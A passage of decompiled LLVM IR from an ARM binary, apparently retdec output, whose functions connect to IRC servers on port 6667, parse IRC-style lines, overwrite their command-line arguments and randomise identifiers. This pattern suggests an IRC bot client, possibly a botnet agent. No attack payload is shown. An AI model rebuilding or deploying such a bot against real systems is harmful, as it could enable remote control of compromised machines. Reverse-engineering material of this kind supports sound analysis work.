  br i1 %v7_bae8, label %dec_label_pc_ba88.preheader, label %dec_label_pc_bb04

dec_label_pc_ba88.preheader:                      ; preds = %dec_label_pc_ba54, %dec_label_pc_bad4
  %storemerge1118 = phi i32 [ 0, %dec_label_pc_ba54 ], [ %v1_bad8, %dec_label_pc_bad4 ]
  %stack_var_-28.317 = phi i8* [ %v3_ba54, %dec_label_pc_ba54 ], [ %v5_bab8, %dec_label_pc_bad4 ]
  %stack_var_-36.316 = phi i32 [ 0, %dec_label_pc_ba54 ], [ %stack_var_-36.2, %dec_label_pc_bad4 ]
  br label %dec_label_pc_ba88

dec_label_pc_baf8:                                ; preds = %dec_label_pc_bb1c
  %v1_bafc = add i32 %storemerge12, 1
  br label %dec_label_pc_bb04

dec_label_pc_bb04:                                ; preds = %dec_label_pc_bad4, %dec_label_pc_baf8
  %storemerge12 = phi i32 [ %v1_bafc, %dec_label_pc_baf8 ], [ 0, %dec_label_pc_bad4 ]
  store i32 %storemerge12, i32* @r4, align 4
  store i32 %v1_bab4, i32* @r0, align 4
  %v0_bb0c = call i32 @function_ecc0()
  %v0_bb14 = load i32, i32* @r4, align 4
  %v3_bb14 = icmp ult i32 %v0_bb14, %v0_bb0c
  br i1 %v3_bb14, label %dec_label_pc_bb1c, label %dec_label_pc_bb04.dec_label_pc_bb38_crit_edge

dec_label_pc_bb04.dec_label_pc_bb38_crit_edge:    ; preds = %dec_label_pc_bb04
  %.pre30 = add i32 %storemerge12, %v1_bab4
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_bb38

dec_label_pc_bb1c:                                ; preds = %dec_label_pc_bb04
  %v2_bb28 = add i32 %storemerge12, %v1_bab4
  %v1_bb2c = inttoptr i32 %v2_bb28 to i8*
  %v2_bb2c = load i8, i8* %v1_bb2c, align 1
  %v7_bb30 = icmp eq i8 %v2_bb2c, 32
  br i1 %v7_bb30, label %dec_label_pc_bb38, label %dec_label_pc_baf8

dec_label_pc_bb38:                                ; preds = %dec_label_pc_bb1c, %dec_label_pc_bb04.dec_label_pc_bb38_crit_edge
  %v3_bb4c.pre-phi = phi i8* [ %.pre31, %dec_label_pc_bb04.dec_label_pc_bb38_crit_edge ], [ %v1_bb2c, %dec_label_pc_bb1c ]
  store i8 0, i8* %v3_bb4c.pre-phi, align 1
  store i32 %v1_bab4, i32* @r0, align 4
  %v2_bb54 = call i32 @function_f3c0(i32 %v1_bab4)
  %v5_bb5c = trunc i32 %v2_bb54 to i8
  store i8 %v5_bb5c, i8* %stack_var_-40, align 1
  %v3_bb64 = icmp eq i8 %v5_bb5c, -1
  br i1 %v3_bb64, label %dec_label_pc_bb6c, label %dec_label_pc_bbc8

dec_label_pc_bb6c:                                ; preds = %dec_label_pc_bb38
  %v2_bb70 = call i32 @function_f3e4(i32 %v1_bab4)
  %v2_bb80 = icmp eq i32 %v2_bb70, 0
  br i1 %v2_bb80, label %dec_label_pc_bb88, label %dec_label_pc_bba4

dec_label_pc_bb88:                                ; preds = %dec_label_pc_bb6c
  %v2_bb8c = load i32, i32* @global_var_21d80.185, align 4
  store i32 %v2_bb8c, i32* @r2, align 4
  %v3_bb9c = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_1593c.222 to i32))
  br label %dec_label_pc_bc24

dec_label_pc_bba4:                                ; preds = %dec_label_pc_bb6c
  %v2_bba4 = ptrtoint i8* %stack_var_-40 to i32
  %v1_bbac = add i32 %v2_bb70, 16
  %v2_bbac = inttoptr i32 %v1_bbac to i32*
  %v3_bbac = load i32, i32* %v2_bbac, align 4
  %v1_bbb0 = inttoptr i32 %v3_bbac to i32*
  %v2_bbb0 = load i32, i32* %v1_bbb0, align 4
  store i32 %v2_bbb0, i32* @r1, align 4
  %v1_bbb8 = add i32 %v2_bb70, 12
  %v2_bbb8 = inttoptr i32 %v1_bbb8 to i32*
  %v3_bbb8 = load i32, i32* %v2_bbb8, align 4
  store i32 %v2_bba4, i32* @r0, align 4
  store i32 %v3_bbb8, i32* @r2, align 4
  %v0_bbc4 = call i32 @function_ec10()
  %v2_bbd4.pre = load i8, i8* %stack_var_-40, align 1
  br label %dec_label_pc_bbc8

dec_label_pc_bbc8:                                ; preds = %dec_label_pc_bb38, %dec_label_pc_bba4
  %v12_bc2826 = phi i32 [ %v0_bbc4, %dec_label_pc_bba4 ], [ %v2_bb54, %dec_label_pc_bb38 ]
  %v2_bbd4 = phi i8 [ %v2_bbd4.pre, %dec_label_pc_bba4 ], [ %v5_bb5c, %dec_label_pc_bb38 ]
  store i8 %v2_bbd4, i8* bitcast (i8** @global_var_1f4f3.224 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_1f4f0.33 to i8*), align 4
  store i32 256, i32* @global_var_1f4f4.35, align 4
  br label %dec_label_pc_bc24

dec_label_pc_bc24:                                ; preds = %dec_label_pc_b984, %dec_label_pc_bab0, %dec_label_pc_ba44, %dec_label_pc_ba0c, %dec_label_pc_bb88, %dec_label_pc_bbc8
  %v12_bc28 = phi i32 [ 0, %dec_label_pc_ba44 ], [ %v4_ba34, %dec_label_pc_ba0c ], [ %v3_bb9c, %dec_label_pc_bb88 ], [ %v12_bc2826, %dec_label_pc_bbc8 ], [ %v0_bac4, %dec_label_pc_bab0 ], [ %v0_b998, %dec_label_pc_b984 ]
  ret i32 %v12_bc28

; uselistorder directives
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %v1_bad8, { 1, 0 }
  uselistorder i32 %v1_bab4, { 2, 4, 3, 0, 1, 5, 6 }
  uselistorder i8* %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %stack_var_-36.2, { 2, 0, 1, 3 }
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v1_b9ac, { 1, 0 }
  uselistorder i8* %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-52, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_1f4f0.33, { 0, 1, 4, 3, 2 }
  uselistorder i32* @global_var_1f4f4.35, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder label %dec_label_pc_bc24, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_bbc8, { 1, 0 }
  uselistorder label %dec_label_pc_bb04, { 1, 0 }
  uselistorder label %dec_label_pc_ba88.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_bab0, { 1, 0 }
  uselistorder label %dec_label_pc_b9d8, { 1, 0 }
  uselistorder label %dec_label_pc_b95c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_b984, { 1, 0 }
}

define i32 @function_bc40(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_bc40:
  %stack_var_-4 = alloca i32, align 4
  store i32 48204, i32* %stack_var_-4, align 4
  %v2_bc48 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_bc48, i32* @fp, align 4
  %v2_bc60 = load i32, i32* @global_var_21c6c.187, align 4
  %v1_bc68 = call i32 @function_fa5c(i32 %v2_bc60)
  %v0_bc6c = call i32 @function_8688()
  store i32 %v0_bc6c, i32* @global_var_21c6c.187, align 4
  ret i32 %v0_bc6c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_bc88(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_bc88:
  %stack_var_-36 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_-36, align 4
  br label %dec_label_pc_bcbc

dec_label_pc_bcb0:                                ; preds = %dec_label_pc_bcd4
  %v1_bcb4 = add i32 %storemerge1, 1
  br label %dec_label_pc_bcbc

dec_label_pc_bcbc:                                ; preds = %dec_label_pc_bc88, %dec_label_pc_bcb0
  %storemerge1 = phi i32 [ 0, %dec_label_pc_bc88 ], [ %v1_bcb4, %dec_label_pc_bcb0 ]
  store i32 %storemerge1, i32* @r4, align 4
  store i32 %arg2, i32* @r0, align 4
  %v0_bcc4 = call i32 @function_ecc0()
  %v0_bccc = load i32, i32* @r4, align 4
  %v3_bccc = icmp ult i32 %v0_bccc, %v0_bcc4
  br i1 %v3_bccc, label %dec_label_pc_bcd4, label %dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge

dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge:    ; preds = %dec_label_pc_bcbc
  %.pre = add i32 %storemerge1, %arg2
  %.pre5 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_bcf0

dec_label_pc_bcd4:                                ; preds = %dec_label_pc_bcbc
  %v2_bce0 = add i32 %storemerge1, %arg2
  %v1_bce4 = inttoptr i32 %v2_bce0 to i8*
  %v2_bce4 = load i8, i8* %v1_bce4, align 1
  %v7_bce8 = icmp eq i8 %v2_bce4, 33
  br i1 %v7_bce8, label %dec_label_pc_bcf0, label %dec_label_pc_bcb0

dec_label_pc_bcf0:                                ; preds = %dec_label_pc_bcd4, %dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge
  %v3_bd04.pre-phi = phi i8* [ %.pre5, %dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge ], [ %v1_bce4, %dec_label_pc_bcd4 ]
  store i8 0, i8* %v3_bd04.pre-phi, align 1
  %v2_bd0c = load i32, i32* @global_var_21c6c.187, align 4
  %v2_bd18 = inttoptr i32 %arg2 to i8*
  %v3_bd18 = call i32 @function_f0f4(i8* %v2_bd18, i32 %v2_bd0c)
  %v2_bd20 = icmp eq i32 %v3_bd18, 0
  br i1 %v2_bd20, label %dec_label_pc_bd28, label %dec_label_pc_bd7c

dec_label_pc_bd28:                                ; preds = %dec_label_pc_bcf0
  %v3_bd28 = load i8*, i8** %stack_var_-36, align 4
  %v2_bd2c = load i8, i8* %v3_bd28, align 1
  %v7_bd30 = icmp eq i8 %v2_bd2c, 58
  br i1 %v7_bd30, label %dec_label_pc_bd38, label %dec_label_pc_bd44

dec_label_pc_bd38:                                ; preds = %dec_label_pc_bd28
  %v4_bd28 = ptrtoint i8* %v3_bd28 to i32
  %v1_bd3c = add i32 %v4_bd28, 1
  %v5_bd40 = inttoptr i32 %v1_bd3c to i8*
  store i8* %v5_bd40, i8** %stack_var_-36, align 4
  br label %dec_label_pc_bd44

dec_label_pc_bd44:                                ; preds = %dec_label_pc_bd28, %dec_label_pc_bd38
  %v3_bd643 = phi i8* [ %v3_bd28, %dec_label_pc_bd28 ], [ %v5_bd40, %dec_label_pc_bd38 ]
  %v2_bd48 = load i32, i32* @global_var_21c6c.187, align 4
  %v2_bd4c = icmp eq i32 %v2_bd48, 0
  br i1 %v2_bd4c, label %dec_label_pc_bd64, label %dec_label_pc_bd54

dec_label_pc_bd54:                                ; preds = %dec_label_pc_bd44
  %v1_bd60 = call i32 @function_fa5c(i32 %v2_bd48)
  %v3_bd64.pre = load i8*, i8** %stack_var_-36, align 4
  br label %dec_label_pc_bd64

dec_label_pc_bd64:                                ; preds = %dec_label_pc_bd44, %dec_label_pc_bd54
  %v3_bd64 = phi i8* [ %v3_bd643, %dec_label_pc_bd44 ], [ %v3_bd64.pre, %dec_label_pc_bd54 ]
  %v4_bd64 = ptrtoint i8* %v3_bd64 to i32
  %v2_bd68 = call i32 @function_f170(i32 %v4_bd64)
  store i32 %v2_bd68, i32* @global_var_21c6c.187, align 4
  br label %dec_label_pc_bd7c

dec_label_pc_bd7c:                                ; preds = %dec_label_pc_bcf0, %dec_label_pc_bd64
  %v12_bd80 = phi i32 [ %v3_bd18, %dec_label_pc_bcf0 ], [ %v2_bd68, %dec_label_pc_bd64 ]
  ret i32 %v12_bd80

; uselistorder directives
  uselistorder i8* %v3_bd28, { 0, 2, 1 }
  uselistorder i32 %storemerge1, { 1, 0, 3, 2 }
  uselistorder i8** %stack_var_-36, { 0, 3, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_bd7c, { 1, 0 }
  uselistorder label %dec_label_pc_bd64, { 1, 0 }
  uselistorder label %dec_label_pc_bd44, { 1, 0 }
  uselistorder label %dec_label_pc_bcbc, { 1, 0 }
}

define i32 @function_bd88() local_unnamed_addr {
dec_label_pc_bd88:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_bd8c = load i32, i32* @fp, align 4
  store i32 48532, i32* %stack_var_-4, align 4
  %v2_bd90 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_bd90, i32* @fp, align 4
  %v2_beb8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_bf24 = ptrtoint i32* %stack_var_-48 to i32
  %v3_bf74 = bitcast i32* %stack_var_-44 to %sockaddr*
  br label %dec_label_pc_bd9c

dec_label_pc_bd9c:                                ; preds = %dec_label_pc_bd9c.backedge, %dec_label_pc_bd88
  store i32 -1, i32* @global_var_21c70.25, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v2_bdb4 = load i32, i32* @global_var_1f4e8.144, align 4
  %v2_bdb8 = icmp eq i32 %v2_bdb4, 0
  br i1 %v2_bdb8, label %dec_label_pc_bdc0, label %dec_label_pc_bdf4

dec_label_pc_bdc0:                                ; preds = %dec_label_pc_bd9c
  %v0_bdc0 = call i32 @function_fe50()
  %v2_bdcc = load i32, i32* @global_var_1f09c.232, align 4
  %v2_bdd8 = call i32 @function_c930(i32 %v0_bdc0, i32 %v2_bdcc)
  %v4_bde8 = mul i32 %v2_bdd8, 4
  %v5_bde8 = add i32 %v4_bde8, ptrtoint ([16 x i8]** @global_var_1f0a0.235 to i32)
  %v6_bde8 = inttoptr i32 %v5_bde8 to i32*
  %v7_bde8 = load i32, i32* %v6_bde8, align 4
  store i32 %v7_bde8, i32* @global_var_21d78.142, align 4
  br label %dec_label_pc_bdf4

dec_label_pc_bdf4:                                ; preds = %dec_label_pc_bd9c, %dec_label_pc_bdc0
  store i32 0, i32* @global_var_1f4e8.144, align 4
  br label %dec_label_pc_be00

dec_label_pc_be00:                                ; preds = %dec_label_pc_be00, %dec_label_pc_bdf4
  %v3_be0c = call i32 @function_f8dc(i32 2, i32 1, i32 6)
  store i32 %v3_be0c, i32* @global_var_21c70.25, align 4
  %v1_be24 = icmp slt i32 %v3_be0c, 0
  br i1 %v1_be24, label %dec_label_pc_be00, label %dec_label_pc_be2c

dec_label_pc_be2c:                                ; preds = %dec_label_pc_be00
  %v2_be30 = load i32, i32* @global_var_21d78.142, align 4
  store i32 %v2_be30, i32* @r0, align 4
  %v1_be38 = call i32 @function_f3c0(i32 %v2_be30)
  %v2_be40 = icmp eq i32 %v1_be38, 0
  br i1 %v2_be40, label %dec_label_pc_be64, label %dec_label_pc_be48

dec_label_pc_be48:                                ; preds = %dec_label_pc_be2c
  %v2_be4c = load i32, i32* @global_var_21d78.142, align 4
  store i32 %v2_be4c, i32* @r0, align 4
  %v1_be54 = call i32 @function_f3c0(i32 %v2_be4c)
  %v3_be5c = icmp eq i32 %v1_be54, -1
  br i1 %v3_be5c, label %dec_label_pc_be64, label %dec_label_pc_bed8

dec_label_pc_be64:                                ; preds = %dec_label_pc_be48, %dec_label_pc_be2c
  %v2_be68 = load i32, i32* @global_var_21d78.142, align 4
  %v1_be70 = call i32 @function_f3e4(i32 %v2_be68)
  %v2_be80 = icmp eq i32 %v1_be70, 0
  br i1 %v2_be80, label %dec_label_pc_be88, label %dec_label_pc_bea8

dec_label_pc_be88:                                ; preds = %dec_label_pc_be64
  store i32 0, i32* @global_var_21d78.142, align 4
  %v2_be98 = load i32, i32* @global_var_21c70.25, align 4
  %v1_bea0 = call i32 @function_ca18(i32 %v2_be98)
  br label %dec_label_pc_bd9c.backedge

dec_label_pc_bd9c.backedge:                       ; preds = %dec_label_pc_be88, %dec_label_pc_c058
  br label %dec_label_pc_bd9c

dec_label_pc_bea8:                                ; preds = %dec_label_pc_be64
  %v1_beac = add i32 %v1_be70, 16
  %v2_beac = inttoptr i32 %v1_beac to i32*
  %v3_beac = load i32, i32* %v2_beac, align 4
  %v1_beb0 = inttoptr i32 %v3_beac to i32*
  %v2_beb0 = load i32, i32* %v1_beb0, align 4
  %v1_bec0 = add i32 %v1_be70, 12
  %v2_bec0 = inttoptr i32 %v1_bec0 to i32*
  %v3_bec0 = load i32, i32* %v2_bec0, align 4
  store i32 %v3_bec0, i32* @r2, align 4
  %v3_bed0 = call i32 @function_ec00(i32 %v2_beb0, i32 %v2_beb8, i32 %v3_bec0)
  br label %dec_label_pc_bef0

dec_label_pc_bed8:                                ; preds = %dec_label_pc_be48
  %v2_bedc = load i32, i32* @global_var_21d78.142, align 4
  store i32 %v2_bedc, i32* @r0, align 4
  %v1_bee4 = call i32 @function_f3c0(i32 %v2_bedc)
  store i32 %v1_bee4, i32* %stack_var_-40, align 4
  br label %dec_label_pc_bef0

dec_label_pc_bef0:                                ; preds = %dec_label_pc_bea8, %dec_label_pc_bed8
  store i32 2, i32* %stack_var_-44, align 4
  %v1_bf08 = call i32 @function_f294(i32 6667)
  %v2_bf20 = load i32, i32* @global_var_21c70.25, align 4
  store i32 %v2_bf20, i32* @r3, align 4
  %v3_bf34 = call i32 @function_cac8(i32 %v2_bf20, i32 21537, i32 %v2_bf24)
  %v2_bf3c = call i32 @function_cb74(i32* null)
  br label %dec_label_pc_c038

dec_label_pc_bf4c:                                ; preds = %dec_label_pc_c038
  %v0_bf4c = call i32 @function_cc08()
  %v2_bf58 = inttoptr i32 %v0_bf4c to i32*
  store i32 0, i32* %v2_bf58, align 4
  %v2_bf60 = load i32, i32* @global_var_21c70.25, align 4
  %v4_bf74 = call i32 @function_f7f4(i32 %v2_bf60, %sockaddr* %v3_bf74, i32 16)
  %v2_bf7c = icmp eq i32 %v4_bf74, 0
  br i1 %v2_bf7c, label %dec_label_pc_bf98, label %dec_label_pc_bf84

dec_label_pc_bf84:                                ; preds = %dec_label_pc_bf4c
  %v0_bf84 = call i32 @function_cc08()
  %v1_bf8c = inttoptr i32 %v0_bf84 to i32*
  %v2_bf8c = load i32, i32* %v1_bf8c, align 4
  %v7_bf90 = icmp eq i32 %v2_bf8c, 106
  br i1 %v7_bf90, label %dec_label_pc_bf98, label %dec_label_pc_c008

dec_label_pc_bf98:                                ; preds = %dec_label_pc_bf84, %dec_label_pc_bf4c
  %v2_bf9c = load i32, i32* @global_var_21c70.25, align 4
  %v6_bfb8 = call i32 @function_f8ac(i32 %v2_bf9c, i32 1, i32 13, i32* null, i32 0)
  %v2_bfc0 = load i32, i32* @global_var_21c70.25, align 4
  %v6_bfdc = call i32 @function_f8ac(i32 %v2_bfc0, i32 1, i32 2, i32* null, i32 0)
  %v2_bfe4 = load i32, i32* @global_var_21c70.25, align 4
  %v6_c000 = call i32 @function_f8ac(i32 %v2_bfe4, i32 1, i32 9, i32* null, i32 0)
  store i32 %v3_bd8c, i32* @fp, align 4
  ret i32 %v6_c000

dec_label_pc_c008:                                ; preds = %dec_label_pc_bf84
  %v0_c008 = call i32 @function_cc08()
  %v1_c010 = inttoptr i32 %v0_c008 to i32*
  %v2_c010 = load i32, i32* %v1_c010, align 4
  %v7_c014 = icmp eq i32 %v2_c010, 115
  br i1 %v7_c014, label %dec_label_pc_c030, label %dec_label_pc_c01c

dec_label_pc_c01c:                                ; preds = %dec_label_pc_c008
  %v0_c01c = call i32 @function_cc08()
  %v1_c024 = inttoptr i32 %v0_c01c to i32*
  %v2_c024 = load i32, i32* %v1_c024, align 4
  %v7_c028 = icmp eq i32 %v2_c024, 114
  br i1 %v7_c028, label %dec_label_pc_c030, label %dec_label_pc_c058

dec_label_pc_c030:                                ; preds = %dec_label_pc_c01c, %dec_label_pc_c008
  %v1_c034 = call i32 @function_10628(i32 1)
  br label %dec_label_pc_c038

dec_label_pc_c038:                                ; preds = %dec_label_pc_bef0, %dec_label_pc_c030
  %v2_c03c = call i32 @function_cb74(i32* null)
  %v2_c04c = sub i32 %v2_c03c, %v2_bf3c
  %tmp = icmp ult i32 %v2_c04c, 10
  br i1 %tmp, label %dec_label_pc_bf4c, label %dec_label_pc_c058

dec_label_pc_c058:                                ; preds = %dec_label_pc_c01c, %dec_label_pc_c038
  store i32 0, i32* @global_var_21d78.142, align 4
  %v2_c068 = load i32, i32* @global_var_21c70.25, align 4
  %v1_c070 = call i32 @function_ca18(i32 %v2_c068)
  br label %dec_label_pc_bd9c.backedge

; uselistorder directives
  uselistorder i32 %v3_bec0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 (i32)* @function_f294, { 9, 7, 6, 5, 4, 3, 2, 1, 0, 8 }
  uselistorder i32 (i32, i32, i32)* @function_ec00, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_f3e4, { 3, 2, 1, 0 }
  uselistorder i32 ()* @function_fe50, { 20, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 19, 18, 17, 16, 1, 0 }
  uselistorder label %dec_label_pc_c058, { 1, 0 }
  uselistorder label %dec_label_pc_c038, { 1, 0 }
  uselistorder label %dec_label_pc_bef0, { 1, 0 }
  uselistorder label %dec_label_pc_bd9c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_bdf4, { 1, 0 }
}

define i32 @function_c094(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_c094:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-1480 = alloca i32, align 4
  %stack_var_-2504 = alloca i32, align 4
  %stack_var_-6600 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-456 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_c094 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_c094, i32* @ip, align 4
  %v3_c098 = load i32, i32* @r4, align 4
  store i32 %v3_c098, i32* %stack_var_-20, align 4
  store i32 49312, i32* %stack_var_-4, align 4
  %v16_c098 = ptrtoint i32* %stack_var_-20 to i32
  %v2_c09c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c09c, i32* @fp, align 4
  %v1_c0c4 = call i32 @function_ca44(i32 %v16_c098)
  %v2_c0cc = icmp eq i32 %v1_c0c4, 0
  br i1 %v2_c0cc, label %dec_label_pc_c0dc, label %dec_label_pc_c0d4

dec_label_pc_c0d4:                                ; preds = %dec_label_pc_c094
  %v1_c0d8 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_c0dc

dec_label_pc_c0dc:                                ; preds = %dec_label_pc_c094, %dec_label_pc_c0d4
  %v2_c0ec = load i32, i32* %arg2, align 4
  store i32 %v2_c0ec, i32* @r4, align 4
  %v2_c100 = load i32, i32* %arg2, align 4
  store i32 %v2_c100, i32* @r0, align 4
  %v0_c108 = call i32 @function_ecc0()
  %v0_c110 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_159bc.238 to i32), i32* @r1, align 4
  %v4_c11c = call i32 @function_ee60(i32 %v0_c110, i32 ptrtoint ([6 x i8]* @global_var_159bc.238 to i32), i32 %v0_c108)
  br label %dec_label_pc_c19c

dec_label_pc_c12c:                                ; preds = %dec_label_pc_c19c
  %v3_c130 = mul i32 %storemerge11, 4
  %v2_c148 = add i32 %v3_c130, %tmp
  %v1_c14c = inttoptr i32 %v2_c148 to i32*
  %v2_c14c = load i32, i32* %v1_c14c, align 4
  store i32 %v2_c14c, i32* @r4, align 4
  %v2_c170 = load i32, i32* %v1_c14c, align 4
  store i32 %v2_c170, i32* @r0, align 4
  %v0_c178 = call i32 @function_ecc0()
  %v0_c180 = load i32, i32* @r4, align 4
  store i32 %v0_c178, i32* @r2, align 4
  %v2_c18c = inttoptr i32 %v0_c180 to i8*
  %v3_c18c = call i32 @function_ec20(i8* %v2_c18c, i32 0)
  %v1_c194 = add nuw i32 %storemerge11, 1
  br label %dec_label_pc_c19c

dec_label_pc_c19c:                                ; preds = %dec_label_pc_c0dc, %dec_label_pc_c12c
  %storemerge11 = phi i32 [ 1, %dec_label_pc_c0dc ], [ %v1_c194, %dec_label_pc_c12c ]
  %v5_c1b4 = icmp slt i32 %storemerge11, %arg1
  br i1 %v5_c1b4, label %dec_label_pc_c12c, label %dec_label_pc_c1b8

dec_label_pc_c1b8:                                ; preds = %dec_label_pc_c19c
  %v2_c1bc = call i32 @function_cb74(i32* null)
  store i32 %v2_c1bc, i32* @r4, align 4
  %v0_c1c4 = call i32 @function_ca70()
  %v0_c1cc = load i32, i32* @r4, align 4
  %v2_c1cc = xor i32 %v0_c1cc, %v0_c1c4
  store i32 %v2_c1cc, i32* @r4, align 4
  %v0_c1d0 = call i32 @function_ca9c()
  %v0_c1d8 = load i32, i32* @r4, align 4
  %v2_c1d8 = add i32 %v0_c1d8, %v0_c1d0
  %v1_c1e0 = call i32 @function_fff4(i32 %v2_c1d8)
  %v0_c1e4 = call i32 @function_8688()
  store i32 %v0_c1e4, i32* @global_var_21c6c.187, align 4
  %v0_c1f4 = call i32 @function_8688()
  store i32 %v0_c1f4, i32* @global_var_21c68.41, align 4
  %v0_c204 = call i32 @function_8688()
  store i32 %v0_c204, i32* @global_var_21c74.242, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_159c4.245 to i32), i32* @global_var_21d80.185, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_159cc.248 to i32), i32* @global_var_21d7c.211, align 4
  store i32 0, i32* @global_var_21d78.142, align 4
  %v2_c27c = ptrtoint i32* %stack_var_-456 to i32
  %v2_c33c = ptrtoint i32* %stack_var_-328 to i32
  %v2_c55c = ptrtoint i32* %stack_var_-6600 to i32
  %v2_c598 = add i32 %v16_c098, -6580
  %v2_c654 = ptrtoint i32* %stack_var_-2504 to i32
  %v2_c708 = ptrtoint i32* %stack_var_-1480 to i32
  %v3_c7e0 = bitcast i32* %stack_var_-1480 to i8*
  br label %dec_label_pc_c23c

dec_label_pc_c23c:                                ; preds = %dec_label_pc_c54c, %dec_label_pc_c2b8, %dec_label_pc_c7d0, %dec_label_pc_c1b8
  %v0_c23c = call i32 @function_bd88()
  %v2_c244 = load i32, i32* @global_var_21c70.25, align 4
  %v2_c24c = load i32, i32* @global_var_21c6c.187, align 4
  %v2_c254 = load i32, i32* @global_var_21c68.41, align 4
  store i32 %v2_c254, i32* @lr, align 4
  store i32 %v2_c24c, i32* @r2, align 4
  %v3_c274 = call i32 @function_8374(i32 %v2_c244, i32 ptrtoint ([41 x i8]* @global_var_159d4.252 to i32))
  br label %dec_label_pc_c290.lr.ph

dec_label_pc_c290.lr.ph:                          ; preds = %dec_label_pc_c504, %dec_label_pc_c588, %dec_label_pc_c7f0, %dec_label_pc_c810, %dec_label_pc_c23c
  br label %dec_label_pc_c290

dec_label_pc_c290:                                ; preds = %dec_label_pc_c290.lr.ph, %dec_label_pc_c290
  %storemerge1225 = phi i32 [ 0, %dec_label_pc_c290.lr.ph ], [ %v1_c2a4, %dec_label_pc_c290 ]
  %v5_c29c = mul nuw nsw i32 %storemerge1225, 4
  %v6_c29c = add i32 %v5_c29c, %v2_c27c
  %v7_c29c = inttoptr i32 %v6_c29c to i32*
  store i32 0, i32* %v7_c29c, align 4
  %v1_c2a4 = add nuw nsw i32 %storemerge1225, 1
  %tmp62 = icmp ult i32 %v1_c2a4, 32
  br i1 %tmp62, label %dec_label_pc_c290, label %dec_label_pc_c2b8

dec_label_pc_c2b8:                                ; preds = %dec_label_pc_c290
  %v2_c2bc = load i32, i32* @global_var_21c70.25, align 4
  %v3_c2c0 = udiv i32 %v2_c2bc, 32
  %v3_c2d4 = mul nuw nsw i32 %v3_c2c0, 4
  %v2_c2dc = add i32 %v3_c2d4, %v16_c098
  %v2_c2e0 = add i32 %v2_c2dc, -436
  %v1_c2e4 = inttoptr i32 %v2_c2e0 to i32*
  %v2_c2e4 = load i32, i32* %v1_c2e4, align 4
  %v1_c2f0 = urem i32 %v2_c2bc, 32
  %v6_c2f8 = shl i32 1, %v1_c2f0
  %v2_c2fc = or i32 %v2_c2e4, %v6_c2f8
  store i32 %v2_c2fc, i32* %v1_c2e4, align 4
  store i32 1200, i32* %stack_var_-328, align 4
  %v2_c330 = load i32, i32* @global_var_21c70.25, align 4
  %v1_c334 = add i32 %v2_c330, 1
  %v5_c350 = call i32 @function_cb44(i32 %v1_c334, i32 %v2_c27c, i32 0, i32 0, i32 %v2_c33c)
  %tmp63 = icmp slt i32 %v5_c350, 1
  br i1 %tmp63, label %dec_label_pc_c23c, label %dec_label_pc_c4f0.preheader

dec_label_pc_c4f0.preheader:                      ; preds = %dec_label_pc_c2b8
  %v2_c4f493 = load i32, i32* @global_var_1f4f8.29, align 4
  %v3_c4fc95 = icmp eq i32 %v2_c4f493, 0
  br i1 %v3_c4fc95, label %dec_label_pc_c504, label %dec_label_pc_c36c

dec_label_pc_c36c:                                ; preds = %dec_label_pc_c4e4, %dec_label_pc_c4f0.preheader
  %storemerge13102 = phi i32 [ %.pre120, %dec_label_pc_c4e4 ], [ 0, %dec_label_pc_c4f0.preheader ]
  %v3_c370 = mul i32 %storemerge13102, 4
  %v2_c37c = load i32, i32* @global_var_21d84.31, align 4
  %v2_c380 = add i32 %v2_c37c, %v3_c370
  %v1_c384 = inttoptr i32 %v2_c380 to i32*
  %v2_c384 = load i32, i32* %v1_c384, align 4
  store i32 %v2_c384, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v3_c394 = call i32 @function_cba0(i32 %v2_c384, i32 0, i32 1)
